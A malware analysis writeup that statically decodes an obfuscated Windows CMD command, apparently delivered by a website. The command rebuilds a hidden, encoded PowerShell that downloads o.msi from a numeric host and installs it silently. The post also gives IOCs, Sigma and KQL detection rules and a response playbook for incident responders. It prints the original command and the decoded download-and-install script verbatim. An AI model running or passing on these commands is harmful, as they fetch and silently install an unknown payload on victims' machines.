---
title: "Website-associated Obfuscated CMD: Full Static Investigation"
slug: "website-associated-obfuscated-cmd-full-static-investigation"
created: "2026-10-09"
updated: "2026-10-09"
category: "Cybersecurity"
description: "A static analysis of an obfuscated Windows CMD artifact that reconstructs and launches a hidden PowerShell downloader and MSI installer command."
author: "Muhammad Rizwan"
tags: "Cybersecurity, Malware Analysis, PowerShell, Incident Response"
featuredImageCreditUrl: ""
featuredImageCredit: ""
featuredImageAlt: ""
featuredImage: /assets/images/posts/website-associated-obfuscated-cmd-full-static-investigation/featured.png
featured: true
---

**Investigation date:** 2026-10-09  

**Artifact:** Windows command submitted by the reporter  

**Verdict:** High-risk, obfuscated PowerShell downloader / MSI installer attempt  

**Method:** Static string reconstruction only. No CMD, PowerShell, installer, or network payload was executed.

> **Handling warning:** The original command below is an executable artifact. Do not paste it into Windows Run, CMD, PowerShell, or a browser-provided verification prompt. Keep it as evidence only.

## Step-by-step static investigation process

Use this process when handling the artifact. The goal is to preserve evidence, reconstruct the command safely, and separate confirmed facts from assumptions. None of these steps require running the supplied CMD, PowerShell, MSI, or network destination.

## Step 1: Preserve the original evidence

Save the command exactly as received before editing, wrapping, or reformatting it. Preserve the source context too: website URL, screenshot, timestamp, browser history entry, page HTML, HAR capture, reporter notes, and any endpoint alert that contained the command. Small changes to quotes, backslashes, line endings, or character encoding can change parsing and hashes.

Record:

| Item | What to capture |
|---|---|
| Original command text | Raw bytes or the closest available copy |
| Source | Website URL, page title, referring page, alert name, or reporter |
| Time context | Local time, UTC time if known, timezone, and clock source |
| Collector | Person or system that collected the artifact |
| Host context | Affected user, browser, endpoint name, and session if available |

## Step 2: Treat the string as live code

Do not test the artifact by pasting it into Windows Run, CMD, PowerShell, or a browser prompt. Store it in a plain text evidence file and work on a copy. If decoding is needed, use an offline script that treats the command as text only. The investigation should not trigger `cmd.exe`, `powershell.exe`, `Invoke-WebRequest`, `msiexec.exe`, or any URL-like value from the artifact.

## Step 3: Identify the outer execution wrapper

Read the first layer without executing it. In this case, the wrapper is:

```text
cmd /v:on /q /c "..."
```

Confirm which shell is expected, which options are present, and where command separators such as `&` split the logic. Here, `/v:on` matters because the command depends on delayed expansion with `!Item!` and `!Ref:...!`.

## Step 4: Extract the lookup table and selector list

Locate the character dictionary assigned to `Ref` and the numeric sequence used by the `for` loop. The command does not store the final PowerShell command in a readable form; it rebuilds the command one character at a time.

For this sample, collect:

| Component | Purpose |
|---|---|
| `Ref` value | Character lookup table |
| `Item=.` | Temporary accumulator with disposable prefix |
| `for %j in (...)` | Ordered list of zero-based character positions |
| `!Ref:~%j,1!` | One-character extraction operation |
| `!Item:@= !` | Placeholder replacement that turns `@` into spaces |
| `!Item:~1!` | Removal of the leading dot before execution |

## Step 5: Reconstruct the CMD output offline

Use a local parser or short script to append `Ref[index]` for every number in the selector list. Replace `@` with spaces and account for the leading dot separately. The reconstructed command should be treated as evidence, not executed.

Checkpoint questions:

| Question | Expected answer in this case |
|---|---|
| Does the path begin with a valid drive letter after the leading dot is removed? | Yes, `C:\Windows\...` |
| Does the command invoke a built-in interpreter? | Yes, Windows PowerShell |
| Are stealth or obfuscation options present? | Yes, hidden window and encoded command flags |
| Is there another encoded layer? | Yes, PowerShell `-enc` |

## Step 6: Decode PowerShell `-EncodedCommand` correctly

PowerShell `-EncodedCommand` uses Base64 over UTF-16LE text. Decode the Base64 bytes as UTF-16LE, not UTF-8. Keep the recovered script as static text and do not run it.

For this artifact, the decoded script performs three actions:

1. Changes directory to `$env:TMP`.
2. Attempts to retrieve content with `Invoke-WebRequest` / `iwr` and save it as `o.msi`.
3. Attempts a quiet Windows Installer launch with `msiexec /i o.msi /qn MSIINSTALLPERUSER=1`.

## Step 7: Validate each claim separately

Separate what the artifact proves from what still needs telemetry. Static decoding can prove the command's intent, but it cannot prove endpoint execution, network success, file creation, installer success, or payload behavior.

| Claim | Static artifact enough? | Evidence needed |
|---|---:|---|
| CMD reconstructs a PowerShell command | Yes | Offline reconstruction |
| PowerShell contains downloader and installer logic | Yes | UTF-16LE Base64 decoding |
| A user or host ran it | No | Process telemetry, EDR, shell history |
| The destination was contacted | No | Proxy, firewall, DNS, EDR network events |
| `o.msi` was written | No | File telemetry or recovered file |
| MSI installed successfully | No | Installer logs, product records, process exit data |
| Payload family or impact | No | MSI sample and endpoint evidence |

## Step 8: Collect endpoint and website evidence

If the artifact came from a live website prompt, investigate both sides. On the website side, preserve HTML, JavaScript, third-party script loads, admin/CMS changes, CDN logs, and deployment history. On the endpoint side, collect process creation, PowerShell logs, file events, installer events, network records, and any recovered `o.msi`.

The key correlation chain is:

```text
website exposure -> user action -> cmd.exe -> powershell.exe -> possible o.msi write -> msiexec.exe -> installed artifacts
```

Every arrow needs evidence. Without that evidence, keep the conclusion at "static decoded installation attempt."

## Step 9: Produce the final assessment

Write the conclusion in confidence levels. Use high confidence for the reproducible string reconstruction and Base64 decoding. Use unknown or unverified for execution, network, installation, persistence, theft, attribution, or malware-family claims unless supporting logs or samples are available.

## 1. What the evidence proves

The supplied command is an obfuscated Windows CMD one-liner. It takes individual characters from a hard-coded lookup string, builds a PowerShell command, replaces `@` placeholders with spaces, and runs that command through `call`. PowerShell gets an encoded script that tries to write `o.msi` into the directory named by `$env:TMP` and then invokes `msiexec` with quiet-install options.

The evidence establishes **intent to download and install**. It does **not** establish a successful network request, an installed MSI, persistence, credential theft, or any particular malware family. Those claims require endpoint data and/or the actual MSI.

## Finding status

| Finding | Status | Basis |
|---|---|---|
| CMD reconstructs a hidden command | Confirmed | Reproduced character indexing offline |
| Recovered executable path is `C:\Windows\...\powershell.exe` | Confirmed statically | Index 25 maps to `C`; initial dot is removed separately |
| Hidden-window and encoded-command options | Confirmed | Recovered `-nop -w h -enc` flags |
| Encoded text contains downloader/installer steps | Confirmed | Base64 decoded as UTF-16LE |
| The command ran successfully on an affected Windows host | Unverified | No endpoint execution records or reproduced Windows test |
| URL parsed and contacted successfully | Not known | No connection logs or execution trace |
| MSI written to disk | Not known | No disk or endpoint evidence |
| MSI installed | Not known | No MSI or installer events provided |
| Malware payload behavior and attribution | Not known | No MSI sample or related telemetry |

## 2. Original artifact — preserved command

This is the exact command provided for analysis, presented as inert text. Avoid using it as a test command.

```cmd
cmd /v:on /q /c "set Ref=yhHeBDrW@E2SL0kFmJc.nz1gbCsPwQ=jYUVtu4:MiZGNOaRovl-A\3Tx8Id6p& set Item=.& (for %j in (25 38 52 7 40 20 58 47 28 26 52 11 0 26 35 3 16 53 10 52 7 40 20 58 47 28 26 27 47 28 3 6 11 1 3 49 49 52 48 22 19 13 52 60 47 28 3 6 26 1 3 49 49 19 3 55 3 8 50 20 47 60 8 50 28 8 1 8 50 3 20 18 8 32 28 4 14 51 25 51 51 17 51 4 49 51 42 37 51 58 23 51 59 51 15 29 51 54 29 4 29 51 5 26 51 45 29 4 53 51 2 57 51 57 51 51 21 51 5 14 51 39 23 51 28 51 5 18 51 39 28 51 22 51 5 32 51 39 51 51 48 51 5 29 51 43 29 51 28 51 5 9 51 39 51 51 23 51 25 13 51 54 28 4 22 51 2 29 51 46 23 4 60 51 42 28 51 41 29 51 23 51 42 56 51 12 23 4 35 51 2 39 51 45 29 51 23 51 25 13 51 34 29 4 21 51 42 33 51 29 23 4 1 51 2 39 51 45 29 4 31 51 15 51 51 32 29 4 0 51 2 39 51 45 29 4 36 51 42 18 51 44 28 4 35 51 2 39 51 45 29 4 49 51 2 23 51 41 29 4 31 51 25 51 51 12 28 4 60 51 25 51 51 24 28 51 36 51 42 13 51 18 28 4 60 51 25 51 51 12 28 4 55 51 42 37 51 57 51 4 43 51 15 39 51 11 29 4 17 51 9 37 51 33 28 4 33 51 9 9 51 54 51 4 39 51 15 51 51 46 29 4 11 51 15 33 51 33 28 4 15 51 15 57 51 27 29 51 55 51 51 30 30) do set Item=!Item!!Ref:~%j,1!) & set Item=!Item:@= !& call !Item:~1!"
```

## Basic artifact metadata

| Property | Observed value |
|---|---|
| Shell wrapper | `cmd /v:on /q /c` |
| Character source | `Ref` environment variable |
| Accumulator | `Item` environment variable |
| Numeric selectors | **353** zero-based indexes |
| Lookup-table length | **61** characters |
| Final execution mechanism | `call !Item:~1!` |
| Download output name | `o.msi` |
| Source command SHA-256 (UTF-8 text, no final newline) | `2fbba484f2e9bb20b8e5e0e51d996fef87c6811dec14e4642f3eacffdef628e6` |

The command hash above identifies this **text representation**, not the MSI. If the original was copied from a site or log, preserve those source bytes too; copying, quoting, or line-ending changes alter a text hash.

## 3. CMD wrapper: what happens first

The outer process starts as:

```text
cmd /v:on /q /c "..."
```

- `/v:on` turns on **delayed expansion**, making `!Item!` and `!Ref:...!` usable as the loop updates variables.
- `/q` disables command echoing. It is not an antivirus bypass.
- `/c` runs the supplied command and exits.
- The double-quoted argument encloses a compound series of CMD statements separated by `&`.

The first assignments are:

```cmd
set Ref=yhHeBDrW@E2SL0kFmJc.nz1gbCsPwQ=jYUVtu4:MiZGNOaRovl-A\3Tx8Id6p
set Item=.
```

`Ref` is a custom character dictionary. `Item` starts with a dot as a disposable prefix. Neither variable contains the final script on its own.

## 4. Character-by-character reconstruction

The attacker supplies `353` space-separated numbers inside a CMD `for` loop. Each number represents a position in `Ref`.

Relevant excerpt:

```cmd
(for %j in (25 38 52 7 40 20 58 47 28 26 52 ...) do set Item=!Item!!Ref:~%j,1!)
```

`!Ref:~%j,1!` asks CMD for a one-character substring at position `%j`. The result is appended to `Item` at every iteration. Positions are **zero based**.

After the loop:

```cmd
set Item=!Item:@= !
call !Item:~1!
```

The replacement converts `@` markers into literal spaces. The substring `!Item:~1!` drops the first character (the prefixed dot). `call` then processes the assembled command line. Since `Item` begins as `.`, the raw accumulated value is `.C:\Windows\...` and `!Item:~1!` produces `C:\Windows\...`. Removing another character would incorrectly leave `:\Windows\...`. The `call` here is not a separate downloaded program; it is CMD's command invocation syntax.

## Why this construction matters

Searching the original one-liner for the complete script text fails because the letters are stored out of order inside `Ref` and referenced by offsets. The numeric sequence conceals the PowerShell executable path and its arguments until runtime. This is string obfuscation, not encryption.


## Index checks and intermediate strings

The first 20 lookups are shown here to make the decoding auditable. The index is zero-based, and the selected character comes from the exact `Ref` string shown above.

| Index | Character | Index | Character | Index | Character | Index | Character |
|---:|:---:|---:|:---:|---:|:---:|---:|:---:|
| 25 | `C` | 38 | `:` | 52 | `\` | 7 | `W` |
| 40 | `i` | 20 | `n` | 58 | `d` | 47 | `o` |
| 28 | `w` | 26 | `s` | 52 | `\` | 11 | `S` |
| 0 | `y` | 26 | `s` | 35 | `t` | 3 | `e` |
| 16 | `m` | 53 | `3` | 10 | `2` | 52 | `\` |

Before replacement, `@` represents spaces. After joining all 353 characters and replacing `@`, the resulting text begins with `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`. The separate accumulator `Item` starts with a dot, so its complete value would start with `.C:\Windows...` until `!Item:~1!` strips the dot. **Do not strip the first character of the 353-character reconstruction itself.**

The exact command contains a literal backslash followed by `3` in the `Ref` value (`\3`). That is **two visible characters**, not an ASCII control character. The earlier article's displayed `Ref` excerpt contained a transcription error that has been corrected here.

## 5. First-layer result: recovered PowerShell command

Static reconstruction of the 353 indexed characters produces the following command line. The initial `.` in `Item` is only a prefix and is removed by `!Item:~1!`; it is **not** part of this decoded string. The encoded blob is data passed to PowerShell and should not be executed:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h -enc YwBkACAAJABlAG4AdgA6AFQATQBQADsAaQB3AHIAIAAzADkAMgAwADcAMwA1ADYAMAAvADQANQAwADEAMAAgAC0ATwB1AHQARgBpAGwAZQAgAG8ALgBtAHMAaQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAOwBtAHMAaQBlAHgAZQBjACAALwBpACAAbwAuAG0AcwBpACAALwBxAG4AIABNAFMASQBJAE4AUwBUAEEATABMAFAARQBSAFUAUwBFAFIAPQAxAA==
```

The significant flags are:

| Token | Function | Security relevance |
|---|---|---|
| `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Runs Windows PowerShell | Uses a built-in interpreter |
| `-nop` | `-NoProfile` abbreviation | Omits PowerShell profile startup scripts |
| `-w h` | Hidden window style | Suppresses a normal visible PowerShell window |
| `-enc` | Encoded command | Hides script text inside Base64 |

Those abbreviations are accepted by Windows PowerShell in common configurations. The command does not by itself prove elevation or bypassing a security product.

## 6. Second-layer decoding: Base64 → UTF-16LE

PowerShell's `-EncodedCommand` input uses Base64-encoded **UTF-16LE** text. Decoding the recovered Base64 as UTF-8 would yield misleading null-byte-separated output. The correct sequence is:

1. Take the characters following `-enc`.
2. Base64-decode that string to bytes.
3. Interpret the bytes as UTF-16LE text.
4. Read the resulting PowerShell, **without executing it**.

## Exact recovered script

```powershell
cd $env:TMP;iwr 392073560/45010 -OutFile o.msi -UseBasicParsing;msiexec /i o.msi /qn MSIINSTALLPERUSER=1
```

For readability, here is the same script split across lines. These are not remediation commands:

```powershell
cd $env:TMP;
iwr 392073560/45010 -OutFile o.msi -UseBasicParsing;
msiexec /i o.msi /qn MSIINSTALLPERUSER=1
```

## Safe, offline reproduction of the decoding

The following Python example reads the saved command as **text**. It never launches CMD or PowerShell and never makes a network request.

```python
from pathlib import Path
import re
import base64

sample = Path("original_cmd.txt").read_text(encoding="utf-8").strip()
lookup = re.search(r"set Ref=([^&]+)", sample).group(1)
selector_text = re.search(r"\(for %j in \((.*?)\) do", sample).group(1)
selectors = [int(value) for value in selector_text.split()]

reconstructed = "." + "".join(lookup[n] for n in selectors)
reconstructed = reconstructed.replace("@", " ")[1:]
print("Reconstructed command:", reconstructed)

encoded = re.search(r"\s-enc\s+(\S+)", reconstructed, re.I).group(1)
script = base64.b64decode(encoded).decode("utf-16le")
print("Recovered PowerShell text:", script)
```

Run only the offline Python decoder against a text copy of the sample, never the original Windows command. The parser assumes the layout of **this specific artifact** and is not a general-purpose CMD parser.

## 7. Third layer: work in the temp directory

```powershell
cd $env:TMP
```

`$env:TMP` is the `TMP` environment-variable value in the PowerShell process. It normally names a temporary directory writable by that user, but it can vary by account or system configuration. Changing directories means the relative filename `o.msi` resolves under that location **if** the `cd` succeeds. There is no check of whether the directory change worked.

**Evidence to look for:** the process working directory, expanded `TMP` value, directory-access failures, and creation of `o.msi`.

## 8. Fourth layer: network retrieval attempt

```powershell
iwr 392073560/45010 -OutFile o.msi -UseBasicParsing
```

`iwr` is the built-in PowerShell alias for `Invoke-WebRequest` in Windows PowerShell. `-OutFile o.msi` asks it to save a response body to a local MSI-named file. `-UseBasicParsing` is an option supported by Windows PowerShell; it does **not** disable TLS checks or security monitoring.

## The destination requires validation

The literal destination supplied to `iwr` is:

```text
392073560/45010
```

It is **not** a fully qualified URL, and no scheme is present in the recovered script. Its numeric first component could have been chosen to disguise a host address, but the string alone does not prove how the particular PowerShell version would parse it or that it reaches a server. Do not quietly rewrite it to a guessed `http://` URL and report that guess as an observed IOC.

If the PowerShell parser rejects the argument or the request fails, the payload will not download through this instruction. The script has no explicit download-success check before moving to the next command.

A destination string is not a file hash or a domain reputation verdict. Record it **exactly**, including the slash.

## 9. Fifth layer: Windows Installer invocation

```powershell
msiexec /i o.msi /qn MSIINSTALLPERUSER=1
```

| Token | Meaning |
|---|---|
| `msiexec` | Windows Installer command-line utility |
| `/i o.msi` | Requests installation of local package `o.msi` |
| `/qn` | No MSI graphical interface |
| `MSIINSTALLPERUSER=1` | Requests per-user install context if the package and system allow it |

This is silent-install intent. It is not proof that the MSI installed. Per-user installation settings do not guarantee the install avoids elevation; custom actions and package authoring determine what actually runs.

A legitimate `msiexec.exe` can run malicious MSI packages. The installer binary itself is not the malware sample.


## Validation: will the command actually work?

There are three separate claims here. **Static decoding:** the indexed character string reconstructs the executable path and the `-enc` argument. **Syntactic plausibility:** the reconstructed path is an ordinary Windows PowerShell path on common installations, and `-nop`, `-w h`, and `-enc` match accepted Windows PowerShell switches. **Observed execution:** still unproven, because no Windows process trace, exit code, console transcript, or host image was supplied.

## CMD-specific conditions

- The outer `cmd /v:on` enables delayed expansion, which is required for `!Item!` to reflect loop updates. The supplied line is written for **interactive CMD syntax**, using `%j` rather than the `%%j` convention of batch files. Running it in a `.bat` file unchanged is not an equivalent test.
- The command assigns `Ref`, creates `Item=.`, then enters a parenthesized `for` group. The loop body uses `%j` substitutions inside `!Ref:~%j,1!`. Whether an exact pasted line runs in a real shell should be checked on a disposable, controlled Windows test system **without allowing the recovered PowerShell or MSI to execute**. This report does not assert such a test took place.
- The command text contains `&` separators and double quotes around the outer command. A browser, chat app, logging pipeline, or shell that modifies those bytes can change parsing. Hash and archive the exact original bytes.
- The initial dot matters only to the accumulator. The command ultimately assembled by the loop begins with the drive letter `C`, not `:`. This resolves the earlier contradiction.
- No `if`, `$?`, `try/catch`, or installer exit-code check is present. The script uses semicolons between PowerShell statements, so it proceeds to the installer command even after a non-terminating request error. If `o.msi` already exists in the working directory, the later command can refer to that file regardless of the current retrieval result.

## Network-string check: `392073560/45010`

As a *32-bit integer interpreted in network byte order*, `392073560` equals hexadecimal `0x175E9158`, which corresponds to `23.94.145.88`. This is an **arithmetic interpretation**, not a verified destination that PowerShell contacted. The `/45010` portion resembles a URL path; it is not a TCP port, since ports use `:port` syntax in ordinary URLs. The recovered operand lacks an explicit URI scheme. Do not transform it into `http://23.94.145.88/45010` in an IOC feed or claim that endpoint was reached without a process/network trace.

A working network request depends on the particular `Invoke-WebRequest` implementation, URI coercion, execution environment, routing, and connectivity. The actual output may be a URI-validation error rather than a download. Record the error and version if a qualified responder can obtain them from existing logs. Do **not** probe the numeric address simply to fill a gap in this report.

## Possible outcomes

| Point in chain | Success evidence | Failure / ambiguity |
|---|---|---|
| CMD character reconstruction | Captured child-process creation matching the decoded PowerShell command | Text-only reconstruction does not prove CMD was executed |
| PowerShell startup | Process creation plus engine or EDR logs | Host policy, executable availability, or shell parsing can stop execution |
| `cd $env:TMP` | Working-directory evidence or later file in expanded temp directory | Missing or inaccessible `TMP` leaves relative `o.msi` path context uncertain |
| `iwr ... -OutFile o.msi` | Response and file-write records, file contents/hash | Missing URI scheme, network error, or blocked request |
| `msiexec /i o.msi /qn ...` | Installer process, event logs, MSI transaction and product records | Attempt could run despite failed download; package could be stale, missing, invalid, or blocked |

## 10. End-to-end sequence and where it can fail

```text
Website-discovered command (delivery method not established)
    |
    v
cmd.exe /v:on /q /c
    |
    +-- sets Ref character dictionary
    +-- sets Item to a leading dot
    +-- loops through 353 numeric positions
    +-- converts @ placeholders to spaces
    +-- strips first dot, invokes assembled command
    |
    v
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h -enc <Base64>
    |
    v
UTF-16LE PowerShell text
    |
    +-- cd $env:TMP
    +-- Invoke-WebRequest -> o.msi [needs valid destination and successful fetch]
    +-- msiexec /i o.msi /qn MSIINSTALLPERUSER=1
    |
    v
Unknown outcome / unknown MSI internals
```

**Important failure points:** CMD parsing/environment limits; missing PowerShell; encoded input errors; invalid URL or network failure; permission or disk errors; absent/corrupt MSI; Windows Installer policy; package-specific install failures. Because the script has no error handling, later statements can be attempted even if an earlier one fails.

## 11. How the website fits in — and what is unknown

The reporter encountered the command as website malware. The provided artifact does not include the page URL, HTML/JavaScript, browser screenshots, server logs, or user interaction record. Thus the method of delivery is **unconfirmed**.

Things to check at the website:

- Did the page show a fake CAPTCHA, browser check, repair prompt, or request to paste something into Windows Run? That would support a **ClickFix-style social engineering** hypothesis.
- Was the command copied by a visitor or injected into a local terminal by some separate software? Record which.
- Does the page contain an iframe, third-party loader, compromised script, or unauthorized content change? Preserve exact script URLs, hashes, and response bodies.
- Was there a browser exploit or protocol handler? Do not assume this from the command alone. Normal website JavaScript does not freely launch `cmd.exe` on the host.

A website compromise and a Windows endpoint compromise are different findings. Both require their own evidence.

## 12. Evidence matrix for a real investigation

| Question | Evidence that answers it | Why it matters |
|---|---|---|
| Did someone run the command? | Process telemetry, Run dialog history if available, EDR records | Distinguishes exposure from execution |
| What did CMD spawn? | Process creation logs and full command line | Confirms reconstructed invocation occurred |
| Did the encoded PowerShell run? | Script Block Logging, engine logs, EDR events | Confirms script execution, not merely intent |
| Was a destination contacted? | Proxy/network logs, DNS where applicable, endpoint connections | Tests URL parsing and reachability |
| Was `o.msi` written? | File events, recovered file, metadata | Confirms download output |
| Did Windows Installer run? | Process records, MSI event logs, install artifacts | Confirms attempt at installation |
| What code did the MSI contain? | Offline static MSI examination, hash, signatures, custom actions | Determines final payload behavior |
| Did it persist or exfiltrate data? | Persistence artifacts, network records, EDR detections | Requires downstream evidence |

## 13. Endpoint log and artifact collection

Start by preserving volatile or short-retention data through the organization's normal response process. Avoid cleaning the machine before collecting the relevant evidence.

**Process execution:** Windows Security **4688** (if command-line auditing is enabled); Sysmon **Event ID 1**; EDR process-tree telemetry. Look for `cmd.exe` followed by `powershell.exe`, then `msiexec.exe` in the same time window. Parentage can vary, so correlate command lines and timestamps rather than requiring one exact tree.

**PowerShell:** Script Block Logging **4104** and Module Logging **4103**, if enabled. The decoded text or `Invoke-WebRequest` call might appear in those records. Logs are not guaranteed to exist on every host.

**File:** Sysmon **Event ID 11** where configured; EDR file writes; filesystem metadata for `%TMP%\o.msi`; installed product records; package cache artifacts. Absence of the file later does not prove it never existed.

**Installer:** Windows Installer application events, MSI logs if available, software inventory changes, services or scheduled tasks created by the package. Never attribute newly found persistence solely to this command without tying it to the MSI.

**Network:** Full command-line destination, proxy transactions, resolved hosts, connection attempts, HTTP response codes, bytes transferred, TLS evidence, and EDR socket telemetry. A literal `392073560/45010` string in a script is not a confirmed network connection.

## 14. Indicators and search pivots

| Type | Indicator | Confidence / caveat |
|---|---|---|
| Exact string | `392073560/45010` | Strong pivot for this script; not a confirmed reachable URL |
| Filename | `o.msi` | Weak alone; combine with temp path and process timing |
| Expected path pattern | `%TMP%\o.msi` | Depends on actual environment value |
| Target executable | `powershell.exe` | Common legitimate tool; flags matter |
| Argument combination | `-nop -w h -enc` | Suspicious with site-provided code; not unique to malware |
| Downloader | `Invoke-WebRequest` / `iwr` | Not malicious by itself |
| Installer command | `msiexec /i o.msi /qn MSIINSTALLPERUSER=1` | Specific combination from recovered text |
| Obfuscation markers | `set Ref=`, `set Item=.`, `!Ref:~%j,1!`, `!Item:@= !` | Distinctive when seen together |
| Original command SHA-256 | `2fbba484f2e9bb20b8e5e0e51d996fef87c6811dec14e4642f3eacffdef628e6` | Hash of copied text, not executable bytes |

Avoid using only `msiexec.exe`, `powershell.exe`, or `o.msi` as a high-confidence alert. Those terms also occur in ordinary software administration. The strongest detection correlates **obfuscated CMD + encoded hidden PowerShell + MSI download/write + quiet MSI execution** within the same session.

## 15. Detection logic in plain English

1. Find process creation where `cmd.exe` receives a command containing `set Ref=`, substring-selection syntax, and delayed expansion.
2. Follow that session to `powershell.exe` with `-enc` and hidden-window parameters.
3. Decode captured PowerShell command text offline and check for the literal destination and MSI file-write intent.
4. Look for a file event involving `o.msi` in that user's temp directory.
5. Follow any `msiexec.exe` invocation that references that path and has `/qn`.
6. If an MSI exists, hash and triage it separately; don't infer its capabilities from the command wrapper.

This is analytic guidance, not a production-ready SIEM rule. Environment-specific telemetry, shell argument normalization, and false-positive testing determine the final detection.

## 16. MITRE ATT&CK mapping

| Technique | Observed behavior | Scope |
|---|---|---|
| **T1059.003 — Windows Command Shell** | CMD one-liner, variable expansion, loop, `call` | Confirmed in artifact |
| **T1059.001 — PowerShell** | Encoded PowerShell command | Confirmed in artifact |
| **T1027 — Obfuscated Files or Information** | Indexed lookup plus Base64 | Confirmed in artifact |
| **T1105 — Ingress Tool Transfer** | Script attempts external package retrieval | Intent confirmed, transfer success unverified |
| **T1218.007 — Msiexec** | Installer invocation through `msiexec.exe` | Invocation intent confirmed; install outcome unknown |

Do **not** assign persistence, data theft, ransomware, credential dumping, or a threat-actor identity without payload or endpoint evidence.

## 17. MSI triage if the package is recovered

Handle a recovered MSI as untrusted evidence. Collect the file's SHA-256, size, creation/modification times, original path, signature status, and acquisition source. Preserve a forensic copy.

Offline inspection should focus on the package's Product/Upgrade codes, embedded files, custom actions, scripts, DLLs, external URLs, services, scheduled tasks, and registry changes described by installer tables. A signed MSI is not automatically safe. Dynamic testing belongs in an isolated malware-analysis environment run by qualified responders, not on the affected user's machine.

Record any findings separately from the wrapper analysis. This command alone does not identify what an MSI custom action would do.

## 18. Response playbook

## If someone only saw the website instruction

Preserve the page URL, screenshot, date/time/timezone, copied command, and relevant browser logs. Do not run it. Report or remove the malicious page content. If you manage the site, examine recent deployments, CMS edits, administrator sessions, third-party scripts, and unauthorized file modifications before restoring from known-good content.

## If someone executed the command

Treat the host as potentially compromised. Notify the security administrator, isolate it according to incident-response policy, and preserve process, PowerShell, file, installer, and network evidence. Check whether `o.msi` actually exists or was installed. Scan with trusted endpoint protection and assess any newly installed software or persistence artifacts. If compromise is confirmed, follow the organization's containment and recovery process, including credential review from a trusted device when appropriate.

## If you administer the website

Capture the affected page and scripts before modification. Compare deployed files and third-party script loads with known-good versions. Determine exactly when the content appeared, what accounts or pipelines changed it, and whether visitor logs show exposure. Remove the malicious delivery component, close the entry point, and communicate to affected visitors if evidence shows they were instructed to execute it.


## Investigation timeline template

**This is a collection template, not an observed event timeline.** Record original timestamps in UTC with their original source timezone, clock offset, host, user/session and log source. Do not fill gaps with guessed times.

| Sequence | Event to verify | Source | Timestamp UTC | Evidence ID | Status |
|---:|---|---|---|---|---|
| 1 | Browser page loaded / suspicious instructions displayed | HAR, browser history, saved HTML, proxy | Not supplied | — | Unknown |
| 2 | `cmd.exe` launch with command line | Security 4688, Sysmon 1, EDR | Not supplied | — | Unknown |
| 3 | PowerShell process and encoded arguments | Process telemetry, PowerShell logs | Not supplied | — | Unknown |
| 4 | URI parse or outbound request result | Script block, proxy, firewall, EDR | Not supplied | — | Unknown |
| 5 | File creation or overwrite of `o.msi` | Sysmon 11, EDR, NTFS metadata | Not supplied | — | Unknown |
| 6 | `msiexec.exe` process and exit status | EDR/process telemetry, Windows Installer events | Not supplied | — | Unknown |
| 7 | Installed product / custom-action effects | MSI inventory, event logs, filesystem/registry | Not supplied | — | Unknown |

Use a single correlation key where possible (host ID, user SID, logon ID, process GUID). A chronological sequence is not proof of causation unless the command line, process relationship, and file hash line up.

## Detection examples

These are **starting points for triage**, not fully tested production rules. Configure them for the actual command-line telemetry and validate against benign software management activity.

## Sigma: suspicious CMD obfuscation

```yaml
title: CMD Indexed Character Reconstruction With Delayed Expansion
id: a3d71e7e-142b-42c1-b0da-bac1f4d31ca2
status: experimental
description: Looks for the distinct CMD variable expansion and indexed substring sequence in this case.
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith: '\cmd.exe'
  selection_args:
    CommandLine|contains|all:
      - '/v:on'
      - 'set Ref='
      - 'set Item=.'
      - '!Ref:~'
      - '!Item:~1!'
  condition: selection_image and selection_args
falsepositives:
  - Administrative or research scripts reusing this obfuscation pattern
level: high
```

## Microsoft Defender Advanced Hunting / KQL: suspicious process arguments

```kusto
DeviceProcessEvents
| where FileName in~ ("cmd.exe", "powershell.exe", "msiexec.exe")
| where (FileName =~ "cmd.exe" and ProcessCommandLine has "set Ref=" and ProcessCommandLine contains "!Ref:~")
    or (FileName =~ "powershell.exe" and ProcessCommandLine has_any ("-enc", "-EncodedCommand") and ProcessCommandLine has_any ("-nop", "-NoProfile"))
    or (FileName =~ "msiexec.exe" and ProcessCommandLine contains "o.msi" and ProcessCommandLine contains "/qn")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessId, InitiatingProcessId
| order by Timestamp asc
```

The KQL query is deliberately broad for hunting. It does not assert the three processes belong to one incident. Join them by device, account/session and tightly scoped time windows before raising an incident. PowerShell's Base64 content may require separate **offline** decoding to find the literal string `392073560/45010`; searching the encoded command line for that cleartext destination will miss it.

## Noise and blind spots

Windows Installer quiet operations and encoded PowerShell both have legitimate uses. Stronger matches require the original obfuscation markers or a decoded script that matches this case. Data can be missing because process command-line capture, 4104 Script Block Logging, Sysmon, EDR retention, or file-auditing configuration was absent. Use both positive evidence and gaps in coverage when assigning confidence.

## MSI evidence checklist

No `o.msi` sample is available here. If authorized responders recover it, keep the original byte stream untouched and record:

| Artifact | What to record | Why |
|---|---|---|
| File identity | SHA-256, SHA-1 if needed for legacy correlation, size, original path, timestamps | Repeatable sample identity |
| Trust metadata | Authenticode signature, signer chain, certificate status | Signed does not mean benign; metadata supports clustering |
| MSI database | `Property`, `Directory`, `File`, `Component`, `Feature` tables | Install targets, product metadata, file layout |
| Code execution | `CustomAction`, `InstallExecuteSequence`, embedded streams | Scripts/DLLs launched during install |
| Changes | `Registry`, `ServiceInstall`, shortcuts, scheduled-task actions if embedded in custom code | Persistence and system modification hypotheses |
| External dependencies | URLs/paths embedded in package or custom actions | Additional stage or resource references |
| Outcome | Installer event/exit code, changes correlated to host timeline | Did installation actually succeed? |

Use offline package inspection under established evidence-handling procedures. Never start the MSI merely to inspect it on an ordinary workstation. Any runtime analysis should be performed only by a qualified malware-analysis team in an isolated environment.

## Website/source-side evidence

The website URL, HTML, JavaScript, and screenshots were not supplied. To establish *how* the command appeared, preserve the page's address, timestamp, response HTML, linked script identifiers, relevant HAR/network records, and a screenshot. Compare against a known-good deployment. Review the CMS/plugin change history, admin login history, CDN settings, and third-party scripts. Check whether the page instructed users to paste a command into Run/terminal; that would support a ClickFix-style **social-engineering** classification, not browser-based arbitrary code execution. If users saw the string only in a warning or quoted article, that is a different exposure scenario.

## Evidence preservation and confidence

